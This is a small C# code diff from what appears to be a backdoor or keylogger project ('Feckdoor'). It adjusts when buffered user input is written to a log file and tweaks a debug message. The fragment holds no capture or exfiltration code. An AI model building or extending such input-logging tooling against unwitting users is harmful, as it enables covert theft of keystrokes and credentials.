@@ -25,7 +25,7 @@ namespace Feckdoor.InputLog
 			{
 				while (InputWriterRunning)
 				{
-					if (PreviousInput.ElapsedMilliseconds > Config.TheConfig.InputLog.SaveWait || UndoneQueue.Count >= Config.TheConfig.InputLog.SaveMaxUndone)
+					if (PreviousInput.ElapsedMilliseconds > Config.TheConfig.InputLog.SaveWait && UndoneQueue.Count > 0 || UndoneQueue.Count >= Config.TheConfig.InputLog.SaveMaxUndone)
 						WriteUndone(Config.TheConfig.InputLog.InputLogFile);
 
 					await Task.Delay(Config.TheConfig.InputLog.SaveDelay);
@@ -38,7 +38,7 @@ namespace Feckdoor.InputLog
 
 		internal void WriteUndone(string inputLogFile)
 		{
-			Log.Debug("Writing input log...");
+			Log.Debug("Writing input log.");
 
 			try
 			{
